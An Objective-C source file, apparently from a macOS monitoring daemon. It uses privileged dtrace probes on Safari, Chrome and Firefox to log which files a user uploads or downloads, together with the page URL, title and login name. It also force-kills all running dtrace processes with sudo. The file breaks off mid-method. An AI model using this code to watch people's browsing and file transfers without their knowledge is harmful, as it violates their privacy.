//
//  UploadDownloadFileCapture.m
//  blbld
//
//  Created by ophat on 6/14/16.
//
//
#include <sys/sysctl.h>
#import <SystemConfiguration/SystemConfiguration.h>

#import "UploadDownloadFileCapture.h"
#import "OpenPanelAppearMointor.h"
#import "NSFileHandle+PID.h"
#import "FirefoxPageHelper.h"

#import "blbldUtils.h"
#import "Firefox.h"
#import "DefStd.h"
#import "SocketIPCSender.h"
#import "SystemUtilsImpl.h"

NSString * const kSafariName  = @"Safari";
NSString * const kChromeName  = @"Google Chrome";
NSString * const kFirefoxName = @"firefox";
NSString * const kFirefoxName_bin = @"firefox-bin";

NSString * const kDUSafariBundleID         = @"com.apple.Safari";
NSString * const kDUFirefoxBundleID        = @"org.mozilla.firefox";
NSString * const kDUGoogleChromeBundleID   = @"com.google.Chrome";

const int kDownloadDirection = 0;
const int kUploadDirection   = 1;

@implementation UploadDownloadFileCapture

@synthesize mSafariTask, mChromeTask, mFirefoxTask;
@synthesize mCmdSafari, mCmdChrome, mCmdFirefox;
@synthesize mFirefoxProfiles;
@synthesize mIsSafariDtraceActive, mIsChromeDtraceActive, mIsFirefoxDtraceActive;
@synthesize mCurrentLogonName;
@synthesize mAvailableProtocol;
@synthesize mCheckIdentical;
@synthesize mLock, mFirefoxSearchProfileLock, mOpenPanelMonitor, mFirefoxPageHelper;

- (id) init {
    if (self = [super init]) {
        self.mCurrentLogonName  = [self userLogonName];
        mAvailableProtocol = [[NSMutableArray alloc]initWithObjects:@"http://",@"https://",nil];
        mCheckIdentical    = [[NSMutableArray alloc]init];
        
        mLock = [[NSLock alloc] init];
        mFirefoxSearchProfileLock = [[NSLock alloc] init];
        mFirefoxProfiles = [[NSMutableDictionary alloc] init];
        mOpenPanelMonitor = [[OpenPanelAppearMointor alloc] init];
        mFirefoxPageHelper = [FirefoxPageHelper sharedHelper];
        
        [self killallDtrace];
    }    
    return self;
}

- (void) startCapture {
    [self stopCapture];
    
    DLog(@"startCapture IFT");
    [[[NSWorkspace sharedWorkspace] notificationCenter] addObserver:self  selector:@selector(targetDidLaunch:)     name:NSWorkspaceDidLaunchApplicationNotification     object:nil];
    [[[NSWorkspace sharedWorkspace] notificationCenter] addObserver:self  selector:@selector(targetDidActive:)     name:NSWorkspaceDidActivateApplicationNotification   object:nil];
    [[[NSWorkspace sharedWorkspace] notificationCenter] addObserver:self  selector:@selector(targetDidDeactive:)   name:NSWorkspaceDidDeactivateApplicationNotification object:nil];
    [[[NSWorkspace sharedWorkspace] notificationCenter] addObserver:self  selector:@selector(targetDidTerminate:)  name:NSWorkspaceDidTerminateApplicationNotification  object:nil];
    
    [mOpenPanelMonitor startMonitor];
    [self startDtrace];
}

- (void) stopCapture {
    DLog(@"stopCapture IFT");
    [[[NSWorkspace sharedWorkspace] notificationCenter] removeObserver:self name:NSWorkspaceDidLaunchApplicationNotification     object:nil];
    [[[NSWorkspace sharedWorkspace] notificationCenter] removeObserver:self name:NSWorkspaceDidActivateApplicationNotification   object:nil];
    [[[NSWorkspace sharedWorkspace] notificationCenter] removeObserver:self name:NSWorkspaceDidDeactivateApplicationNotification object:nil];
    [[[NSWorkspace sharedWorkspace] notificationCenter] removeObserver:self name:NSWorkspaceDidTerminateApplicationNotification  object:nil];
    
    [mOpenPanelMonitor stopMonitor];
    [self stopDtrace];
}

#pragma mark - Private methods -

- (NSString *) userLogonName {
    uid_t uid = 0;
    gid_t gid = 0;
    NSString *username = (NSString *)SCDynamicStoreCopyConsoleUser(NULL, &uid, &gid);
    return ([username autorelease]);
}

- (void) killallDtrace {
    DLog(@"killall dtrace IFT");
    NSArray *pids = [self getTargetPIDFromCommand:@"dtrace"];
    for (NSString *pid in pids) {
        NSString *killDtrace = [NSString stringWithFormat:@"sudo kill -9 %@",pid];
        DLog(@"####killDtrace %@",killDtrace);
        system([killDtrace UTF8String]);
    }
}

- (void) targetDidLaunch:(NSNotification *) notification {
    NSDictionary *userInfo = [notification userInfo];
    NSRunningApplication *runningApp = [userInfo objectForKey:@"NSWorkspaceApplicationKey"];
    NSString * appBundleIdentifier = runningApp.bundleIdentifier;
    DLog(@"Did launch : %@", notification);
    if ([appBundleIdentifier isEqualToString:kDUSafariBundleID]) {
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
            [self startDtraceSafari];
        });
    }
    if ([appBundleIdentifier isEqualToString:kDUGoogleChromeBundleID]) {
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
            [self startDtraceGoogleChrome];
        });
    }
    if ([appBundleIdentifier isEqualToString:kDUFirefoxBundleID]) {
        // Firefox can launch multiple profiles
    }
    
}

- (void) targetDidActive:(NSNotification *) notification {
    NSDictionary *userInfo = [notification userInfo];
    NSRunningApplication *runningApp = [userInfo objectForKey:@"NSWorkspaceApplicationKey"];
    NSString * appBundleIdentifier = runningApp.bundleIdentifier;
    DLog(@"Did active : %@", notification);
    if ([appBundleIdentifier isEqualToString:kDUSafariBundleID]       ||
        [appBundleIdentifier isEqualToString:kDUGoogleChromeBundleID]) {
        
    }
    if ([appBundleIdentifier isEqualToString:kDUFirefoxBundleID]) {
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
            // Firefox can launch multiple profiles
            [self stopDtraceFirefox];
            [self startDtraceFirefox];
        });
    }
}

- (void) targetDidDeactive:(NSNotification *) notification {
    // DO NOTHING
}

- (void) targetDidTerminate:(NSNotification *) notification {
    NSDictionary *userInfo = [notification userInfo];
    NSString * appBundleIdentifier = [userInfo objectForKey:@"NSApplicationBundleIdentifier"];
    DLog(@"Did quit : %@", notification);
    if ([appBundleIdentifier isEqualToString:kDUSafariBundleID]) {
        [self stopDtraceSafari];
    }
    if ([appBundleIdentifier isEqualToString:kDUGoogleChromeBundleID]) {
        [self stopDtraceGoogleChrome];
    }
    if ([appBundleIdentifier isEqualToString:kDUFirefoxBundleID]) {
        // Firefox can launch multiple profiles
        NSNumber *pid = [userInfo objectForKey:@"NSApplicationProcessIdentifier"];
        dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_LOW, 0), ^{
            [self.mFirefoxSearchProfileLock lock];
            [self.mFirefoxProfiles removeObjectForKey:pid];
            [self.mFirefoxSearchProfileLock unlock];
            DLog(@"Profiles of running Firefoxs : %@", self.mFirefoxProfiles);
        });
    }
}

#pragma mark Start dtrace
-(void) startDtrace {
    DLog(@"dtrace start capture probe");
    // Safari
    [self startDtraceSafari];
    
    // Google Chrome
    [self startDtraceGoogleChrome];
    
    // Firefox
    [self startDtraceFirefox];
}

- (void) startDtraceSafari {
    if (!mIsSafariDtraceActive) {
        int safariPID = [self getPID:kSafariName active:false];
        if (safariPID != -1) {
            mIsSafariDtraceActive = YES;
            
            self.mCmdSafari = [NSString stringWithFormat:@"dtrace -w -p %d -n",safariPID];
            
            // http://www.brendangregg.com/DTrace/dtrace_oneliners.txt
            NSString * commandSafari  = [NSString stringWithFormat:@"sudo dtrace -w -p %d -n",safariPID];
            commandSafari = [NSString stringWithFormat:@"%@ 'syscall::stat64:entry /execname == \"%@\"/",commandSafari,kSafariName];
            commandSafari = [commandSafari stringByAppendingString:@"{ printf(\"%s %s\",execname,copyinstr(arg0));}'"];
            DLog(@"####commandSafari %@",commandSafari);
            
            [self startWithCommand:commandSafari withApp:@"Safari" pid:safariPID];
        }
    }
}

- (void) startDtraceGoogleChrome {
    if (!mIsChromeDtraceActive) {
        int chromePID = [self getPID:kChromeName active:false];
        if (chromePID != -1) {
            mIsChromeDtraceActive = YES;
            
            self.mCmdChrome = [NSString stringWithFormat:@"dtrace -w -p %d -n",chromePID];
            
            NSString * commandChrome = [NSString stringWithFormat:@"sudo dtrace -w -p %d -n",chromePID];
            commandChrome = [NSString stringWithFormat:@"%@ 'syscall::stat64:entry /execname == \"%@\"/",commandChrome,kChromeName];
            commandChrome = [commandChrome stringByAppendingString:@"{ printf(\"%s %s\",execname,copyinstr(arg0));}'"];
            DLog(@"####commandChrome %@",commandChrome);
            
            [self startWithCommand:commandChrome withApp:@"Chrome" pid:chromePID];
        }
    }
}

- (void) startDtraceFirefox {
    if (!mIsFirefoxDtraceActive) {
        // Always search for active first for Firefox
        NSString *firefoxName = kFirefoxName;
        int firefoxPID = [self getPID:kFirefoxName active:true];
        if (firefoxPID == -1) {
            firefoxPID = [self getPID:kFirefoxName_bin active:true];
            firefoxName = kFirefoxName_bin;
        }
        if (firefoxPID == -1) {
            firefoxPID = [self getPID:kFirefoxName active:false];
            firefoxName = kFirefoxName;
        }
        if (firefoxPID == -1) {
            firefoxPID = [self getPID:kFirefoxName_bin active:false];
            firefoxName = kFirefoxName_bin;
        }
        if (firefoxPID != -1) {
            mIsFirefoxDtraceActive = YES;
            
            dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
                [self getProfilePathFirefox:firefoxPID];
            });
            
            self.mCmdFirefox = [NSString stringWithFormat:@"dtrace -w -p %d -n",firefoxPID];
            
            NSString * commandFirefox = [NSString stringWithFormat:@"sudo dtrace -w -p %d -n",firefoxPID];
            commandFirefox = [NSString stringWithFormat:@"%@ 'syscall::stat64:entry /execname == \"%@\"/",commandFirefox,firefoxName];
            commandFirefox = [commandFirefox stringByAppendingString:@"{ printf(\"%s %s\",execname,copyinstr(arg0));}'"];
            DLog(@"####commandFirefox %@",commandFirefox);
            
            [self startWithCommand:commandFirefox withApp:@"Firefox" pid:firefoxPID];
        }
    }
}

#pragma mark  Stop dtrace
- (void) stopDtrace {
    DLog(@"dtrace stop capture probe");
    
    // Safari
    [self stopDtraceSafari];
    
    // Google Chrome
    [self stopDtraceGoogleChrome];
    
    // Firefox
    [self stopDtraceFirefox];
}

- (void) stopDtraceSafari {
    if (mIsSafariDtraceActive) {
        mIsSafariDtraceActive = NO;
        if (mSafariTask) {
            id standardOutput = mSafariTask.standardOutput;
            if ([standardOutput isKindOfClass:[NSPipe class]]) {
                [[NSNotificationCenter defaultCenter] removeObserver:self name:NSFileHandleDataAvailableNotification object:[(NSPipe *)standardOutput fileHandleForReading]];
            } else if ([standardOutput isKindOfClass:[NSFileHandle class]]) {
                [[NSNotificationCenter defaultCenter] removeObserver:self name:NSFileHandleDataAvailableNotification object:(NSFileHandle *)standardOutput];
            }
            DLog(@"Safari standardOutput : %@", standardOutput);
            DLog(@"Task, running : %d, PID : %d", mSafariTask.isRunning, mSafariTask.processIdentifier);
            
            [mSafariTask terminate];
            [mSafariTask release];
            mSafariTask = nil;
        }
        if ([mCmdSafari length]>0) {
            NSArray * pid_dtrace_safari = [[NSArray alloc]initWithArray:[self getTargetPIDFromCommand:mCmdSafari]];
            for (int i = 0; i < [pid_dtrace_safari count]; i++) {
                if ([[pid_dtrace_safari objectAtIndex:i] length] >0) {
                    NSString * clearSafari = [NSString stringWithFormat:@"sudo kill -9 %@",[pid_dtrace_safari objectAtIndex:i]];
                    DLog(@"####clearSafari %@",clearSafari);
                    system([clearSafari UTF8String]);
                }
            }
            [pid_dtrace_safari release];
            self.mCmdSafari = @"";
        }
    }
}

- (void) stopDtraceGoogleChrome {
    if (mIsChromeDtraceActive) {
        mIsChromeDtraceActive = NO;
        if (mChromeTask) {
            id standardOutput = mChromeTask.standardOutput;
            if ([standardOutput isKindOfClass:[NSPipe class]]) {
                [[NSNotificationCenter defaultCenter] removeObserver:self name:NSFileHandleDataAvailableNotification object:[(NSPipe *)standardOutput fileHandleForReading]];
            } else if ([standardOutput isKindOfClass:[NSFileHandle class]]) {
                [[NSNotificationCenter defaultCenter] removeObserver:self name:NSFileHandleDataAvailableNotification object:(NSFileHandle *)standardOutput];
            }
            DLog(@"Google Chrome standardOutput : %@", standardOutput);
            DLog(@"Task, running : %d, PID : %d", mChromeTask.isRunning, mChromeTask.processIdentifier);
            
            [mChromeTask terminate];
            [mChromeTask release];
            mChromeTask = nil;
        }
        if ([mCmdChrome length]>0) {
            NSArray * pid_dtrace_chrome = [[NSArray alloc]initWithArray:[self getTargetPIDFromCommand:mCmdChrome]];
            for (int i = 0; i < [pid_dtrace_chrome count]; i++) {
                if ([[pid_dtrace_chrome objectAtIndex:i] length] >0) {
                    NSString * clearChrome = [NSString stringWithFormat:@"sudo kill -9 %@",[pid_dtrace_chrome objectAtIndex:i]];
                    DLog(@"####clearChrome %@",clearChrome);
                    system([clearChrome UTF8String]);
                }
            }
            [pid_dtrace_chrome release];
            self.mCmdChrome = @"";
        }
    }
}

- (void) stopDtraceFirefox {
    if (mIsFirefoxDtraceActive) {
        mIsFirefoxDtraceActive = NO;
        if (mFirefoxTask) {
            id standardOutput = mFirefoxTask.standardOutput;
            if ([standardOutput isKindOfClass:[NSPipe class]]) {
                [[NSNotificationCenter defaultCenter] removeObserver:self name:NSFileHandleDataAvailableNotification object:[(NSPipe *)standardOutput fileHandleForReading]];
            } else if ([standardOutput isKindOfClass:[NSFileHandle class]]) {
                [[NSNotificationCenter defaultCenter] removeObserver:self name:NSFileHandleDataAvailableNotification object:(NSFileHandle *)standardOutput];
            }
            DLog(@"Firefox standardOutput : %@", standardOutput);
            DLog(@"Task, running : %d, PID : %d", mFirefoxTask.isRunning, mFirefoxTask.processIdentifier);
            
            [mFirefoxTask terminate];
            [mFirefoxTask release];
            mFirefoxTask = nil;
        }
        if ([mCmdFirefox length]>0) {
            NSArray * pid_dtrace_firefox = [[NSArray alloc]initWithArray:[self getTargetPIDFromCommand:mCmdFirefox]];
            for (int i = 0; i < [pid_dtrace_firefox count]; i++) {
                if ([[pid_dtrace_firefox objectAtIndex:i] length] >0) {
                    NSString * clearFirefox = [NSString stringWithFormat:@"sudo kill -9 %@",[pid_dtrace_firefox objectAtIndex:i]];
                    DLog(@"####clearFirefox %@",clearFirefox);
                    system([clearFirefox UTF8String]);
                }
            }
            [pid_dtrace_firefox release];
            self.mCmdFirefox = @"";
        }
    }
}

#pragma mark - CommandRunner

- (void) startWithCommand: (NSString *) aCmd withApp: (NSString *) aApp pid: aPID {
    NSPipe *pipe = [NSPipe pipe];
    if ([aApp isEqualToString:@"Safari"]) {
        if (mSafariTask) {
            [mSafariTask terminate];
            [mSafariTask release];
            mSafariTask = nil;
        }
        mSafariTask = [[NSTask alloc] init];
        [mSafariTask setLaunchPath: @"/bin/sh"];
        [mSafariTask setArguments:@[@"-c", aCmd]];
        [mSafariTask setStandardOutput:pipe];
        
        NSFileHandle *file1 = [pipe fileHandleForReading];
        file1.pid = aPID;
        [[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(pipeDataAvailableSafari:) name:NSFileHandleDataAvailableNotification object:file1];
        [file1 waitForDataInBackgroundAndNotify];
        [mSafariTask launch];
    } else if ([aApp isEqualToString:@"Chrome"]) {
        if (mChromeTask) {
            [mChromeTask terminate];
            [mChromeTask release];
            mChromeTask = nil;
        }
        mChromeTask = [[NSTask alloc] init];
        [mChromeTask setLaunchPath: @"/bin/sh"];
        [mChromeTask setArguments:@[@"-c", aCmd]];
        [mChromeTask setStandardOutput:pipe];
        
        NSFileHandle *file2 = [pipe fileHandleForReading];
        file2.pid = aPID;
        [[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(pipeDataAvailableChrome:) name:NSFileHandleDataAvailableNotification object:file2];
        [file2 waitForDataInBackgroundAndNotify];
        
        [mChromeTask launch];
    } else if ([aApp isEqualToString:@"Firefox"]) {
        if (mFirefoxTask) {
            [mFirefoxTask terminate];
            [mFirefoxTask release];
            mFirefoxTask = nil;
        }
        mFirefoxTask = [[NSTask alloc] init];
        [mFirefoxTask setLaunchPath: @"/bin/sh"];
        [mFirefoxTask setArguments:@[@"-c", aCmd]];
        [mFirefoxTask setStandardOutput:pipe];
        
        NSFileHandle *file3 = [pipe fileHandleForReading];
        file3.pid = aPID;
        [[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(pipeDataAvailableFirefox:) name:NSFileHandleDataAvailableNotification object:file3];
        [file3 waitForDataInBackgroundAndNotify];
        [mFirefoxTask launch];
    }
}

- (void) pipeDataAvailableSafari: (NSNotification *) notif {
    //DLog(@"dtrace from Safari: %@", notif);
    [self processNotification:notif from:@"Safari"];
}

- (void) pipeDataAvailableChrome: (NSNotification *) notif {
    //DLog(@"dtrace from Chrome: %@", notif);
    [self processNotification:notif from:@"Chrome"];
}

- (void) pipeDataAvailableFirefox: (NSNotification *) notif {
    //DLog(@"dtrace from Firefox: %@", notif);
    [self processNotification:notif from:@"Firefox"];
}

- (void) processNotification: (NSNotification *) notif from: (NSString *) aAppName {
    NSFileHandle *file = [notif object];
    NSData *data = [file availableData];
    if (data.length > 0) {
        NSString *returnFromCMD = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
        [file waitForDataInBackgroundAndNotify];
        DLog(@"------------------------------------------------------------------------------------");
        DLog(@"pid : %d", file.pid);
        DLog(@"returnFromCMD : %@", returnFromCMD);
        DLog(@"------------------------------------------------------------------------------------");
        
        NSMutableDictionary * info = [[[NSMutableDictionary alloc] init] autorelease];
        [info setObject:returnFromCMD forKey:@"output"];
        [info setObject:[NSNumber numberWithInt:file.pid] forKey:@"pid"];
        [NSThread detachNewThreadSelector:@selector(processDtraceOutput:) toTarget:self withObject:info];
        
        [returnFromCMD release];
    } else { // 0: EOF
        DLog(@"dtrace EOF Ooop! CHECK PID...");
        [[NSNotificationCenter defaultCenter] removeObserver:self name:NSFileHandleDataAvailableNotification object:file];
        
        SEL startSelector = nil;
        SEL stopSelector = nil;
        
        if ([aAppName isEqualToString:@"Safari"]) {
            stopSelector = @selector(stopDtraceSafari);
            startSelector = @selector(startDtraceSafari);
        } else if ([aAppName isEqualToString:@"Chrome"]) {
            stopSelector = @selector(stopDtraceGoogleChrome);
            startSelector = @selector(startDtraceGoogleChrome);
        } else if ([aAppName isEqualToString:@"Firefox"]) {
            stopSelector = @selector(stopDtraceFirefox);
            startSelector = @selector(startDtraceFirefox);
        }
        
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
            [self performSelector:stopSelector];
            [self performSelector:startSelector];
        });
    }
}

- (void) processDtraceOutput:(NSDictionary *)aDict {
    @try {
        NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
        [aDict retain];
        [self analyzeData:aDict[@"output"] pid:[aDict[@"pid"] intValue]];
        [aDict release];
        [pool drain];
    } @catch (NSException *exception) {
        DLog(@"Process dtrace output exception: %@", exception);
    } @finally {
        ;
    }
}

- (void) analyzeData:(NSString *) aStringOutput pid:(pid_t) aPID {
    NSAutoreleasePool * mainPool = [[NSAutoreleasePool alloc] init];
    
    NSString * title      = @"";
    NSString * appName    = @"";
    NSString * url        = @"";
    NSString * appID      = @"";
    NSString * userName   = self.mCurrentLogonName;
    
    NSArray * cutter = [aStringOutput componentsSeparatedByString:@"\n"];
    for (int i = 0; i < [cutter count]; i++) {
        NSString *dtraceFilePath = [cutter objectAtIndex:i];
        if ([dtraceFilePath rangeOfString:@" /"].location != NSNotFound) {
            
            if (([dtraceFilePath rangeOfString:[NSString stringWithFormat:@"/Users/%@/Desktop",self.mCurrentLogonName]].location   != NSNotFound  ||
                 [dtraceFilePath rangeOfString:[NSString stringWithFormat:@"/Users/%@/Documents",self.mCurrentLogonName]].location != NSNotFound  ||
                 [dtraceFilePath rangeOfString:[NSString stringWithFormat:@"/Users/%@/Downloads",self.mCurrentLogonName]].location != NSNotFound  ||
                 [dtraceFilePath rangeOfString:[NSString stringWithFormat:@"/Users/%@/Movies",self.mCurrentLogonName]].location    != NSNotFound  ||
                 [dtraceFilePath rangeOfString:[NSString stringWithFormat:@"/Users/%@/Music",self.mCurrentLogonName]].location     != NSNotFound  ||
                 [dtraceFilePath rangeOfString:[NSString stringWithFormat:@"/Users/%@/Pictures",self.mCurrentLogonName]].location  != NSNotFound  ||
                 [dtraceFilePath rangeOfString:[NSString stringWithFormat:@"/Users/%@/Public",self.mCurrentLogonName]].location    != NSNotFound)) {
                
                NSString * filename   = @"";
                NSString * pathTofile = @"";
                
                // Only get appName, appID, url, title once since this method is process per notification from one app at a time
                if ([dtraceFilePath rangeOfString:kSafariName].location != NSNotFound) {
                    if (appName.length == 0)    appName = @"Safari";
                    if (appID.length == 0)      appID   = kDUSafariBundleID;
                    if (url.length == 0)        url     = [self getURLSafari];
                    if (title.length == 0)      title   = [self getTitleSafari];
                } else if ([dtraceFilePath rangeOfString:kChromeName].location != NSNotFound) {
                    if (appName.length == 0)    appName = @"Google Chrome";
                    if (appID.length == 0)      appID   = kDUGoogleChromeBundleID;
                    if (url.length == 0)        url     = [self getURLChrome];
                    if (title.length == 0)      title   = [self getTitleChrome];
                } else if ([dtraceFilePath rangeOfString:kFirefoxName].location != NSNotFound) {
                    if (appName.length == 0)    appName = @"Firefox";
                    if (appID.length == 0)      appID   = kDUFirefoxBundleID;
                    //if (title.length == 0)      title   = [self getTitleFirefox:aPID];
                    //if (url.length == 0)        url     = [self getURLFirefox:aPID title:title];
                    if (title.length == 0)      title   = [[self.mFirefoxPageHelper.mCurrentTitle copy] autorelease];
                    if (url.length == 0)        url     = [[self.mFirefoxPageHelper.mCurrentUrl copy] autorelease];
                    
                    if (url.length == 0) {
                        sleep(0.2);
                        //url = [self getURLFirefox:aPID title:title];
                        url = [[self.mFirefoxPageHelper.mCurrentUrl copy] autorelease];
                    }
                }
                DLog(@"title : %@", title);
                DLog(@"url   : %@", url);
                
                if (url && [self isProtocolSupport:url]) {
                    BOOL isDir = NO;
                    NSFileManager *fileManager = [NSFileManager defaultManager];
                    NSString *fullpath = [NSString stringWithFormat:@"/%@",[[dtraceFilePath componentsSeparatedByString:@" /"] objectAtIndex:1]];
                    if ([fullpath rangeOfString:@".crdownload"].location == NSNotFound &&   // Google Chrome
                        [fullpath rangeOfString:@".download"].location   == NSNotFound &&   // Safari
                        [fullpath rangeOfString:@".DS_Store"].location   == NSNotFound ) {  // Safari
                        if ([fileManager fileExistsAtPath:fullpath isDirectory:&isDir]) {
                            if (!isDir) {
                                // Check direction
                                int direction = kUploadDirection;
                                if ([self isJustModifyFile:fullpath]) {
                                    direction = kDownloadDirection;
                                } else {
                                    if ([dtraceFilePath rangeOfString:kFirefoxName].location != NSNotFound) { // Firefox (firefox, firefox-bin)
                                        NSString *firefoxDownloadPath = [fullpath stringByAppendingString:@".part"];
                                        if ([fileManager fileExistsAtPath:firefoxDownloadPath]) {
                                            DLog(@"Firefox get download direction from .part searching");
                                            direction = kDownloadDirection;
                                        }
                                        else {
                                            if ([self isFirefoxJustModifyProfilePath:[self getProfilePathFirefox:aPID]]) { // Observe that Firefox always update profile db when download file
                                                /*
                                                 Effect to all upload files which need to wait for the same time as download
                                                 */
                                                NSDate *startDelay = [NSDate date];
                                                while ([[NSDate date] timeIntervalSinceDate:startDelay] < 5) {
                                                    if ([self isFileJustDownload:fullpath firefoxPID:aPID]) {
                                                        DLog(@"Firefox get download direction from Firefox db query");
                                                        direction = kDownloadDirection;
                                                        break;
                                                    }
                                                    [NSThread sleepForTimeInterval:1.0];
                                                }
                                            } else {
                                                // Make sure the upload files did not trigger by 'Open With', 'Save as', 'Open File' panel of firefox
                                                NSTimeInterval panelDisappearAt = self.mOpenPanelMonitor.mPanelDisappearAt;
                                                if ([[NSDate date] timeIntervalSince1970] - panelDisappearAt >= 15) {
                                                    DLog(@"Firefox ignores file : %@", fullpath);
                                                    continue;
                                                }
                                            }
                                        }
                                    }
                                    else { // Safari, Google Chrome
                                        NSString *safariDownloadPattern = @".download";
                                        NSString *chromeDownloadPattern = @".crdownload";
                                        for (NSString *dtraceString in cutter) {
                                            if ([dtraceString rangeOfString:safariDownloadPattern].location != NSNotFound ||
                                                [dtraceString rangeOfString:chromeDownloadPattern].location != NSNotFound) {
                                                DLog(@"Safari, Chrome get download direction from .download, .crdownload searching");
                                                direction = kDownloadDirection;
                                                break;
                                            }
                                        }
                                        
                                        if (direction == kUploadDirection) {
                                            // Make sure the upload files did not trigger by 'Open File',... panel
                                            NSTimeInterval panelDisappearAt = self.mOpenPanelMonitor.mPanelDisappearAt;
                                            if ([[NSDate date] timeIntervalSince1970] - panelDisappearAt >= 2) {
                                                DLog(@"Chrome or Safari ignores file : %@", fullpath);
                                                continue;
                                            }

                                        }
                                    }
                                }
                                
                                filename = fullpath.lastPathComponent;
                                pathTofile = fullpath.stringByDeletingLastPathComponent;
                                DLog(@"filename : %@", filename);
                                DLog(@"pathTofile : %@", pathTofile);
                                DLog(@"direction : %d", direction);
                                
                                NSAutoreleasePool * pool = [[NSAutoreleasePool alloc] init];
                                
                                NSMutableDictionary * info = [[[NSMutableDictionary alloc] init] autorelease];
                                
                                [info setObject:fullpath        forKey:@"fullpath"];
                                [info setObject:userName        forKey:@"currentlogonname"];
                                [info setObject:appID           forKey:@"appid"];
                                [info setObject:appName         forKey:@"appname"];
                                [info setObject:url             forKey:@"url"];
                                [info setObject:title           forKey:@"title"];
                                [info setObject:filename        forKey:@"filename"];
                                [info setObject:pathTofile      forKey:@"pathTofile"];
                                [info setObject:[NSDate date]   forKey:@"time"];
                                [info setObject:[NSNumber numberWithInt:direction] forKey:@"direction"];
                                
                                [NSThread detachNewThreadSelector:@selector(writeDataInThread:) toTarget:self withObject:info];
                                
                                [pool drain];
                            }
                        } else {
                            if ([dtraceFilePath rangeOfString:kSafariName].location != NSNotFound) {
                                DLog(@"####Safari File Not Found %@",fullpath);
                            }else{
                                DLog(@"####Chrome, Firefox File Not Found %@",fullpath);
                            }
                        }
                    }
                }else{
                    DLog(@"####Protocol not support ::::: %@",url);
                }
            }
        }
    }
    [mainPool drain];
}

-(void) writeDataInThread:(NSDictionary *)aDict{
    @try {
        NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
        [aDict retain];
        
        // Check duplicate
        [self.mLock lock];
        
        // Critical section [START]
        BOOL isDuplicateFile = NO;
        NSMutableArray *expiredInfos = [[[NSMutableArray alloc] init] autorelease];
        for (NSDictionary *fileInfo in self.mCheckIdentical) {
            NSDate *captureDate = [fileInfo objectForKey:@"time"];
            NSTimeInterval timeInterval = [[NSDate date] timeIntervalSinceDate:captureDate];
            //DLog(@"timeInterval : %f", timeInterval);
            if (timeInterval <= 60) {
                /*
                 Keep file for 1 minute for checking duplication.
                 
                 File consider duplicate if url and file path are the same regardless of application use to download or upload because
                 server did not show the application to the user.
                 */
                NSString *url = [fileInfo objectForKey:@"url"];
                NSString *fullpath = [fileInfo objectForKey:@"fullpath"];
                if ([[aDict objectForKey:@"url"] isEqualToString:url] &&
                    [[aDict objectForKey:@"fullpath"] isEqualToString:fullpath]) {
                    isDuplicateFile = YES;
                    break;
                }
                
            } else {
                [expiredInfos addObject:fileInfo];
            }
        }
        
        // Remove expired files
        for (NSDictionary *fileInfo in expiredInfos) {
            DLog(@"fileInfo is an expired file : %@, %@", [fileInfo objectForKey:@"url"], [fileInfo objectForKey:@"fullpath"]);
            [self.mCheckIdentical removeObject:fileInfo];
        }
        
        if (!isDuplicateFile) {
            [self.mCheckIdentical addObject:aDict];
        }
        // Critical section [FINISH]
        
        [self.mLock unlock];
        
        if (isDuplicateFile) {
            DLog(@"aDict is a duplicated file : %@, %@", [aDict objectForKey:@"url"], [aDict objectForKey:@"fullpath"]);
            return;
        }
        
        // Check file size
        NSError *error = nil;
        unsigned long long fileSize = 0;
        NSDate *startDate = [NSDate date];
        while ([[NSDate date] timeIntervalSinceDate:startDate] < 60*60) { // Enter loop for 1 hour timeout
            NSString *fullpath = [aDict objectForKey:@"fullpath"];
            NSFileManager *fileManager = [NSFileManager defaultManager];
            NSDictionary *attributes = [fileManager attributesOfItemAtPath:fullpath error:&error];
            fileSize = [attributes fileSize];
            //DLog(@"attribute: %@, error : %@", attributes, error);
            if (fileSize > 0) {
                break;
            }
            DLog(@"Delay for file size");
            sleep(1);
            
            if (![fileManager fileExistsAtPath:fullpath]) {
                break;
            }
        }
        DLog(@"fileSize : %llu", fileSize); // File size can be zero if user upload or download file that its size really zero
        if (fileSize > 0) {
            NSString *writer = [NSString stringWithFormat:@"%@|%@|%@|%@|%@|%@|%@|%@|%llu", [aDict objectForKey:@"direction"],
                                [aDict objectForKey:@"currentlogonname"],
                                [aDict objectForKey:@"appid"],
                                [aDict objectForKey:@"appname"],
                                [aDict objectForKey:@"url"],
                                [aDict objectForKey:@"title"],
                                [aDict objectForKey:@"filename"],
                                [aDict objectForKey:@"pathTofile"],fileSize];
            
            DLog(@"####daemon: %@", writer);
            
            [self captureInternetFileTransferEvent:writer];
        }
        
        [aDict release];
        [pool drain];
    } @catch (NSException *exception) {
        DLog(@"Examine data exception: %@", exception);
    } @finally {
        ;
    }
}

-(BOOL) isProtocolSupport:(NSString *)aUrl {
    BOOL support = NO;
    for (int i = 0; i < [self.mAvailableProtocol count]; i++) {
        if ([aUrl rangeOfString:[self.mAvailableProtocol objectAtIndex:i]].location != NSNotFound) {
            support = YES;
            break;
        }
    }
    return support;
}

#pragma mark - Utils methods

- (BOOL) isFirefoxJustModifyProfilePath: (NSString *) aProfilePath {
    NSFileManager *fileManager = [NSFileManager defaultManager];
    NSDictionary *attributes = [fileManager attributesOfItemAtPath:aProfilePath error:nil];
    if (attributes) {
        NSDate *modifiedDate = [attributes fileModificationDate];
        if ([[NSDate date] timeIntervalSinceDate:modifiedDate] < 5) {
            //DLog(@"Firefox did moidify at %@", modifiedDate);
            return YES;
        }
    }
    //DLog(@"Firefox did not modify profile for at least 5 seconds");
    return NO;
}

- (BOOL) isFileJustDownload: (NSString *) aFilePath firefoxPID: (pid_t) aPID {
